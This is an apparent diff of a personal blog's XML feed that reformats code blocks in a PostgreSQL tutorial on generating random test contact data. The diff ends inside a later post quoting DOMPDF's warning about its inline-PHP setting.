+&lt;span class=&quot;k&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CONFLICT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;DO&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;NOTHING&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
 &lt;p&gt;The &lt;code&gt;ON CONFLICT&lt;/code&gt; part is ot available before PostgreSQL 9.5, it can be used to
 ignore the unique key errors. On an older PostgreSQL you&#39;ll have to generate
@@ -584,12 +991,13 @@ And of course i need these dates in a random order, but with an increment that I
 
 &lt;p&gt;This sort of data group can be used in my request like a table by using the keyword &lt;code&gt;WITH&lt;/code&gt;:&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;WITH&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dates1083&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;WITH&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dates1083&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- here the big dates select ...&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;tbl1&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;INNER&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;JOIN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dates1083&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tbl1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;foo_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dates1083&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
+    &lt;span class=&quot;k&quot;&gt;INNER&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;JOIN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dates1083&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tbl1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;foo_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dates1083&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
 &lt;p&gt;This avoids creating a temporary table, this table will only be used in the current query.&lt;/p&gt;
 
@@ -597,11 +1005,11 @@ And of course i need these dates in a random order, but with an increment that I
 
 &lt;p&gt;In a simplified version, where the big generators are replaced by [ ... comments blocs .. ] we&#39;ll get :&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;WITH&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dates1083&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;WITH&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dates1083&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;..&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Here&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;whole&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1083&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;columns&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pseudo&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;table&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;generation&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
+&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-&lt;p&gt;&lt;span class=&quot;k&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;contact&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;contact&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;con_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;con_active&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;con_firstname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
@@ -651,32 +1059,32 @@ And of course i need these dates in a random order, but with an increment that I
     &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;-- comp_id (used for joining company table, adding comp_name on email&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&lt;em&gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&lt;/em&gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;comp_id&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;comp_id&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;-- base_date_num (used for joining dates1083 pseudo-table, and computing others dates from that&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&lt;em&gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1083&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&lt;/em&gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_date_num&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1083&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_date_num&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;-- con_active, something like 10% of false (inactive)&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&lt;em&gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&lt;/em&gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;con_active&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;con_active&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;-- has_1st interaction something like 95%&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&lt;em&gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&lt;/em&gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;has_1st_interact&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;has_1st_interact&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;-- has_2nd interaction something like 65%&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&lt;em&gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&lt;/em&gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;has_2nd_interact&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;has_2nd_interact&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;-- let&amp;#39;s hide some non required fields sometimes&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;-- hiding 5 % of last_names&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&lt;em&gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&lt;/em&gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;show_last_name&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;show_last_name&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;-- hiding 5 % of first_names&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&lt;em&gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&lt;/em&gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;show_first_name&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;show_first_name&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;-- id&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;
@@ -685,7 +1093,8 @@ And of course i need these dates in a random order, but with an increment that I
     &lt;span class=&quot;k&quot;&gt;INNER&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;JOIN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;company&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;company&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;comp_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main_sub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;comp_id&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;INNER&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;JOIN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dates1083&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dates1083&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rownum&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main_sub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base_date_num&lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;-- ignore conflicts of ids, but not any checks constraint failure (on dates for example)&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CONFLICT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;DO&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;NOTHING&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;span class=&quot;k&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CONFLICT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;DO&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;NOTHING&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
 &lt;p&gt;Here is &lt;a href=&quot;https://github.com/regilero/regilero.github.com/blob/master/theme/resource/pgserie/generating_contacts.sql&quot;&gt;the full and commented version, without the INSERT part&lt;/a&gt;.
 There&#39;s a lot of elements inside, my advice is to copy that in a pgadmin SQL session and to play with the various columns.
@@ -745,7 +1154,7 @@ we can obtain some very different explain schemes:&lt;/p&gt;
 &lt;p&gt;Of course variations on the examples can be made. Here is a link to a &lt;a href=&quot;https://gist.github.com/regilero/e0066e66e2c505f7a0edddf8bf104bb7&quot;&gt;hoity-toity french names generator&lt;/a&gt;.&lt;/p&gt;
 </description>
 				<published>2017-06-26 00:00:00 +0200</published>
-				<link>http://regilero.github.io/postgresql/english/2017/06/26/postgresql_advanced_generate_series/</link>
+				<link>http://regilero.github.io/english/postgresql/2017/06/26/postgresql_advanced_generate_series/</link>
 			</item>
 		
 			<item>
@@ -894,29 +1303,29 @@ everybody, even google.&lt;/p&gt;
 &lt;p&gt;Let&#39;s first have a look at theses strange settings, that you should not allow,
 from the config file:&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;/&lt;em&gt;&lt;em&gt;&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;&lt;/em&gt; Enable inline PHP&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;&lt;/em&gt;&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;&lt;em&gt; If this setting is set to true then DOMPDF will automatically evaluate&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;&lt;/em&gt; inline PHP contained within &amp;lt;script type=&amp;quot;text/php&amp;quot;&amp;gt; ... &amp;lt;/script&amp;gt; tags.&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;&lt;em&gt;&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;&lt;/em&gt; Attention!&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;&lt;em&gt; Enabling this for documents you do not trust (e.g. arbitrary remote html&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;&lt;/em&gt; pages) is a security risk. Inline scripts are run with the same level of&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;&lt;em&gt; system access available to dompdf. Set this option to false (recommended)&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;&lt;/em&gt; if you wish to process untrusted documents.&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;&lt;em&gt;&lt;/span&gt;
